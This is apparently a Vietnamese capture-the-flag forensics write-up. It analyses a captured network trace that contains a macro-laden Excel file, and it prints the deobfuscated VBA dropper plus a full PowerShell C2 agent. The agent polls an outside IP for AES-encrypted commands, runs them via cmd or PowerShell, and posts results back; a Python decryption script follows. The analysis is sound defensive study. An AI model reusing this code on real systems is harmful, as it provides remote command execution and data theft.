![image](https://github.com/M1nh-Duk/Writeups/assets/100038173/c4e5cc2f-c5b0-4905-a445-7e66c9e53b22)

- Bài cho chúng ta 1 file pcapng trong đó có 1 packet chứa file excel có chứa macro

![image](https://github.com/M1nh-Duk/Writeups/assets/100038173/f2bf3916-58f8-4363-8303-c1ed362a87bb)

- Export file ra xem trong đó có chứa gì
  
![image](https://github.com/M1nh-Duk/Writeups/assets/100038173/82cd4f55-9aed-424e-a3fe-404db6a69365)

- Sử dụng <code>olevba</code> để có được đoạn script bị obfuscate khá đau mắt :))

  ![image](https://github.com/M1nh-Duk/Writeups/assets/100038173/14cd44ae-4efa-41de-94fd-1b8750411ade)

- Đây là phiên bản dễ đọc hơn 
```
Sub Auto_Open()
Workbook_Open
End Sub
Sub AutoOpen()
Workbook_Open
End Sub
Sub WorkbookOpen()
Workbook_Open
End Sub
Sub Document_Open()
Workbook_Open
End Sub
Sub DocumentOpen()
Workbook_Open
End Sub

Function func1(param)
var1 = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄÅÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
var2 = "ãXL1lYU~Ùä,Ca²ZfÃ@dO-cq³áÕsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(ÒSw|T*Â$EåyhiÚx65Dà¿2ÁÔ"
For y = 1 To Len(param)
var3 = InStr(var1, Mid(param, y, 1))
If var3 > 0 Then
var4 = Mid(var2, var3, 1)
var5 = var5 + var4
Else
var5 = var5 + Mid(param, y, 1)
End If
Next
func1 = var5
For var6 = 1 To Len(var7)
var7 = var6
Next
For var8 = 2 To Len(var9)
var9 = 2
Next
For var10 = 3 To Len(var11)
var11 = var10
Next
For var12 = 4 To Len(var13)
var13 = 2
Next
End Function


Sub Workbook_Open()
Dim outer_var1 As Object
Dim outer_var2 As String
Dim outer_var3 As String
Dim outer_var4 As String
Dim outer_var5 As Integer
outer_var5 = Chr(50) + Chr(48) + Chr(48)
Set outer_var1 = CreateObject("WScript.Shell")
outer_var2 = outer_var1.SpecialFolders("AppData")
Dim outer_var6
Dim outer_var7
Dim outer_var8
Dim var6 As Long
Dim var8 As String
Dim outer_var9 As Long
Dim var11 As String
Dim var10 As Long
Dim var12 As String
Dim outer_var10 As String
Dim var9 As Long
Dim outer_var11
Dim outer_var12
Dim outer_var13 As Integer
Dim outer_var14
Dim outer_var15
outer_var13 = 1
Range("A1").Value = func1("4BEiàiuP3x6¿QEi³")
Dim outer_var16 As String
outer_var17 = "$x¿PÜ_jEPkEEiPÜ_6IE3P_i3PÛx¿²PàQBx²³_i³P3x6¿QEi³bPÜ_jEPkEEiPb³x#Eir" & vbCrLf & "ÒxP²E³²àEjEP³ÜEbEP3_³_(PÛx¿P_²EP²E7¿à²E3P³xP³²_ib0E²P@mmIP³xP³ÜEP0x##xÄàiuPk_iIP_66x¿i³Pi¿QkE²:P" & vbCrLf & "@m@m@mo@@§mmm" & vbCrLf & "g66x¿i³PÜx#3E²:PLu¿ÛEiPÒÜ_iÜP!xiu" & vbCrLf & "t_iI:PTtPt_iI"
outer_var16 = func1(outer_var17)
MsgBox outer_var16, vbInformation, func1("pEP3EEB#ÛP²Eu²E³P³xPài0x²QPÛx¿")
Dim outer_var18 As Date
Dim outer_var19 As Date
outer_var18 = Date
outer_var19 = DateSerial(2023, 6, 6)
If outer_var18 < outer_var19 Then
Set outer_var14 = CreateObject("microsoft.xmlhttp")
Set outer_var12 = CreateObject("Shell.Application")                                                                                 
outer_var11 = outer_var2 + func1("\k¿i6Ü_~Bb@")
outer_var14.Open "get", func1("Ü³³Bb://uàb³~uà³Ü¿k¿bE²6xi³Ei³~6xQ/k7¿_iQ_i/fÀ3_o-3Yf0_E6m6kk3_km§3Y03ÀY_3__/²_Ä/À3EÀkfmfÀ@Eããoãä§k@_@ã0ä6_E3-ãY036-@@koo/_Àmb6m@§~Bb@"), False
outer_var14.send
outer_var7 = outer_var14.responseBody
If outer_var14.Status = 200 Then
Set outer_var6 = CreateObject("adodb.stream")                                                                                   
outer_var6.Open
outer_var6.Type = outer_var13
outer_var6.Write outer_var7
outer_var6.SaveToFile outer_var11, outer_var13 + outer_var13
outer_var6.Close
End If
outer_var20.Open (outer_var11)
Else
MsgBox func1("åxi'³P³²ÛP³xP²¿iPQEPk²x")
End If
End Sub

```

- Tiếp đến đọc code và thấy được rằng ở <code>outer_var14</code> script sẽ tạo 1 object thực hiện gửi request GET đến 1 url là output của <code>func1</code>
- Thử chạy đoạn này thì có được link github có script powershell của tác giả : https://gist.githubusercontent.com/bquanman/98da73d49faec0cbbdab02d4fd84adaa/raw/8de8b90981e667652b1a16f5caed364fdc311b77/a80sc012.ps1

 ![image](https://github.com/M1nh-Duk/Writeups/assets/100038173/a4bf0c2b-b89a-490c-9219-42768c452045)

- Sử dụng <code>ScriptBLocking</code> của Powershell để có được 1 đoạn script nữa sau khi chạy

![image](https://github.com/M1nh-Duk/Writeups/assets/100038173/bccaa9e1-8cbb-480e-95e4-53e16234abf8)

- Lại 1 đoạn script nữa bị obfuscate. Dùng <code>PSDecode</code> để deobfuscate và có được đoạn script cuối 
```
${8rT3WA}  = [tyPe]'sySTEm.seCUrItY.cryPTOGRaphY.CiphERMOde' ;
SV '72j5O'  (  [TYpe]'sYstem.seCuriTY.cRYptoGRapHY.paDDingmOde'  ) ;   
${XNfD}=[tyPe]'System.cONVErT'  ;  
${HLvW1} =  [tYPe]'SYStEM.tEXt.EnCOdiNG';  
.'SeT-iTem' 'vARIabLE:92y7'  (  [Type]'SysteM.NEt.dnS')  ; 
${UJXRc}=[tyPE]'StrinG' ;
function CrEATe-AeSmanAGeDoBJeCt(${vxZTmff}, ${5TMRWpLUy}) {
    ${AJuJVRAZ99}           = .'New-Object' 'System.Security.Cryptography.AesManaged'
    ${AJUjvrAZ99}.Mode      =   (  .'gEt-vARIAblE'  ("8rt3Wa") -Value  )::"c`Bc"
    ${aJujVRAZ99}.PAddInG   =  ( .Dir  'vARIable:72j5o'  ).VALUe::"ze`Ros"
    ${AJUJvrAz99}.BlOckSizE = 128
    ${AjuJvRAz99}.keysIze   = 256
    if (${5TMRWPluy}) {
        if (${5TmRWpLuy}.getType.iNVOke().nAME -eq 'String') {
            ${ajUjvRaZ99}.Iv =  (&'dir'  'vaRIaBle:xNFd').vAlUe::'FromBase64String'.InVOKe(${5TMRWPlUy})
        }
        else {
            ${ajUjVraZ99}.IV = ${5tmRwPLUy}
        }
    }
    if (${VxZtMFF}) {
        if (${VXzTmfF}.getType.INvoKe().nAME -eq 'String') {
            ${ajUjVraZ99}.Key =  ( LS 'VariAble:XNFD' ).vAluE::'FromBase64String'.invOKe(${vxzTmFF})
        }
        else {
            ${AjUJVrAZ99}.key = ${vXzTmff}
        }
    }
    ${aJUjvRAZ99}
}
function eNCRYpT(${VxzTMFf}, ${ROFPdqRF99}) {
    ${ByTES}             =   (  .varIable  'hlvW1' ).vALUE::"u`Tf8".GetBytes.INVokE(${rOFpdQRF99})
    ${ajujVRAZ99}        = .'Create-AesManagedObject' ${VXZtMFf}
    ${qDIqLGaQ99}         = ${aJujVRAZ99}.CreateEncryptor.inVoKe()
    ${lwihYmIF99}     = ${QdiqLgaq99}.TransformFinalBlock.iNvOKe(${byTeS}, 0, ${byTes}.LeNgTh);
    [byte[]] ${fJAxUWQN99} = ${AJujvRAz99}.Iv + ${lWiHYmiF99}
    ${ajUJVRAZ99}.Dispose.iNVOKE()
     ${xNFd}::"tOBase6`4`S`TRi`NG".iNvoke(${FjAXUWqN99})
}
function deCRyPT(${VXztmFF}, ${bKJrxQCf99}) {
    ${bYTEs}           =   (&'vARiable'  'xnfd' ).ValuE::'FromBase64String'.InVOKE(${BkjRxqcF99})
    ${5tMRWpLuY}              = ${BYTes}[0..15]
    ${aJuJVraz99}      = .'Create-AesManagedObject' ${VxZTmFF} ${5TMRwpLUY}
    ${MNDmWYnB99}       = ${AJUjvRAz99}.CreateDecryptor.InVoke();
    ${AhtLMYhl99} = ${MNDmWynB99}.TransformFinalBlock.iNvokE(${bYTES}, 16, ${byTeS}.lENgTH - 16);
    ${AJUjVRAZ99}.Dispose.INVOKE()
      ${HLVW1}::"uT`F8".GETStriNg(${AhtLmYhl99}).TRIM([char]0)
}
function ShELL(${DfJz1co}, ${yo8xm5}){
    ${CwzVYVJ}                        = &'New-Object' 'System.Diagnostics.ProcessStartInfo'
    ${CwZVyVj}.FIlename               = ${DFjZ1co}
    ${CWzvYvj}.reDIRecTsTAnDaRdERrOR  = ${TRue}
    ${cwZVYVJ}.ReDIREcTsTANdarDoUTPUT = ${tRUe}
    ${CWZvyVJ}.USEshELleXeCUTe        = ${FALsE}
    ${cwzvyVJ}.aRgUmENtS              = ${yO8xm5}
    ${p}                            = .'New-Object' 'System.Diagnostics.Process'
    ${P}.sTArTiNFO                  = ${CWzvYVj}
    ${p}.Start.INvoKE() | &'Out-Null'
    ${P}.WaitForExit.invoKE()
    ${BHnxNUrW99} = ${p}.staNdardOuTpUT.ReadToEnd.INVOkE()
    ${NmWkjOAB99} = ${p}.StANdArdeRrOR.ReadToEnd.Invoke()
    ${kCNjcQdL} = ('VALID '+"$BhnXnUrW99`n$nmWKJOAb99")
    ${KcnJcQDl}
}
${FZvyCr}   = '128.199.207.220'
${twFTrI} = '7331'
${VxzTmff}  = 'd/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M='
${n}    = 3
${Cwj2TWh} = ""
${yCRUTw} =   ${92Y7}::'GetHostName'.inVoKE()
${FNFFGXDzj}  = "p"
${DFctDFM}  = ('http' + ':' + "//$FZVYCR" + ':' + "$TwFTRi/reg")
${kVQBXbuR}  = @{
    'name' = "$YCRUTw" 
    'type' = "$fNFFGXDZJ"
    }
${CWj2TWh}  = (&'Invoke-WebRequest' -UseBasicParsing -Uri ${dFctDFM} -Body ${kVqBxbUr} -Method 'POST').coNTENT
${TvYMeYrR99} = ('http' + ':' + "//$FZVYCR" + ':' + "$TwFTRi/results/$cWJ2Twh")
${iJfySE2}   = ('http' + ':' + "//$FZVYCR" + ':' + "$TwFTRi/tasks/$cWJ2Twh")
for (;;){
    ${MA04XMgY}  = (.'Invoke-WebRequest' -UseBasicParsing -Uri ${IJFYSE2} -Method 'GET').cONTeNt
    if (-Not  ${UJXRc}::'IsNullOrEmpty'.INvOKe(${MA04XmGy})){
        ${mA04XMgY} = .Decrypt ${VXZTmff} ${Ma04XMgY}
        ${mA04XMgY} = ${ma04XMgy}.split.INvokE()
        ${FLAG} = ${MA04xmgY}[0]
        if (${FlAg} -eq 'VALID'){
            ${WB1SWYoje} = ${MA04XMgY}[1]
            ${yO8XM5S}    = ${Ma04XMgY}[2..${MA04xmgY}.LeNgTH]
            if (${wb1sWyoJe} -eq 'shell'){
                ${F}    = 'cmd.exe'
                ${yO8XM5}  = "/c "
                foreach (${a} in ${yo8xM5s}){ ${Yo8xm5} += ${a} + " " }
                ${KcNJCQdL}  = .shell ${f} ${yo8xM5}
                ${kCnjCQDL}  = .Encrypt ${VxztMFF} ${kcNjcqdl}
                ${kvqbXBUr} = @{'result' = "$KcnJCQDl"}
                &'Invoke-WebRequest' -UseBasicParsing -Uri ${tVyMEyRR99} -Body ${kVQbXbur} -Method 'POST'
            }
            elseif (${Wb1SwYOJe} -eq 'powershell'){
                ${f}    = 'powershell.exe'
                ${yO8Xm5}  = "/c "
                foreach (${a} in ${Yo8xM5s}){ ${YO8xm5} += ${a} + " " }
                ${kcNjcqdL}  = &'shell' ${F} ${yO8XM5}
                ${kcnjCQDL}  = .Encrypt ${vXZTmfF} ${KCNjcqDl}
                ${KVqbxBUr} = @{'result' = "$KcnJCQDl"}
                &'Invoke-WebRequest' -UseBasicParsing -Uri ${tvyMEYRR99} -Body ${kVqBXbUr} -Method 'POST'
            }
            elseif (${wb1swYOJe} -eq 'sleep'){
                ${n}    = [int]${yO8Xm5S}[0]
                ${kVQBXbur} = @{'result' = ""}
                &'Invoke-WebRequest' -UseBasicParsing -Uri ${tVYmeyrR99} -Body ${KvQBXBur} -Method 'POST'
            }
            elseif (${wb1sWyojE} -eq 'rename'){
                
                ${cwJ2tWh}    = ${YO8Xm5S}[0]
                ${TVYmeyRr99} = ('http' + ':' + "//$FZVYCR" + ':' + "$TwFTRi/results/$cWJ2Twh")
                ${ijFYsE2}   = ('http' + ':' + "//$FZVYCR" + ':' + "$TwFTRi/tasks/$cWJ2Twh")
            
                ${kVQbXbUr}    = @{'result' = ""}
                .'Invoke-WebRequest' -UseBasicParsing -Uri ${TVYmEyRR99} -Body ${KvqBxbUr} -Method 'POST'
            }
            elseif (${wB1sWYOJe} -eq 'quit'){
                exit
            }
        }
    .sleep ${N}
    }
}
```

- Có vẻ như đoạn script này sẽ thực hiện kết nối tới server <code>128.199.207.220</code> để nhận command từ server và gửi result tới server với payload được mã hóa bằng AES CBC (key là <code>d/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M='</code> còn iv là 16 byte đầu của payload đã base64 decode)
- Có được các thông tin đó, quay trở lại file pcap và đi tìm command từ server
![image](https://github.com/M1nh-Duk/Writeups/assets/100038173/b4c284ce-8d3c-4fb0-9950-82340ff0377d)

- Thử decrypt bằng đoạn script dưới đây
```
import base64
from Crypto.Cipher import AES

f = open("base64_payload.txt","r")
key = 'd/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M='
key = base64.b64decode(key)
data = f.readlines()
for string in data:
    # Decode the base64-encoded key and encrypted
    encrypted = base64.b64decode(string)
    # Extract the IV from the decoded encrypted
    iv = encrypted[:16]
    # Ensure key size is 256 bits
    if len(key) < 32:
        key = key.ljust(32, b'\0')
    elif len(key) > 32:
        key = key[:32]

    # Ensure block size is 128 bits
    if len(iv) < 16:
        iv = iv.ljust(16, b'\0')
    elif len(iv) > 16:
        iv = iv[:16]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_string = cipher.decrypt(encrypted).rstrip(b'\0')
    print("Decrypted string:", str(decrypted_string))

```
- Decrypt ra các command được gửi từ server

![image](https://github.com/M1nh-Duk/Writeups/assets/100038173/25006559-6d0b-4d35-9f95-69099ac8bdd1)

- Vậy thì giờ chỉ cần đi tìm response từ máy victim gửi đến server với method POST

![image](https://github.com/M1nh-Duk/Writeups/assets/100038173/3986ed1d-3dd3-49c7-ac56-56f4a1c146e8)

- Decrypt ra và có được 1 file ảnh
  ![Screenshot 2023-07-11 105850](https://github.com/M1nh-Duk/Writeups/assets/100038173/e667da59-61d2-48de-bdd6-768068a31440)

  
- Đây là mã QR và ném lên cyberchef là có được flag 
![Screenshot 2023-07-11 111239](https://github.com/M1nh-Duk/Writeups/assets/100038173/908e6952-03f4-44e6-bb9b-eff30c8de033)

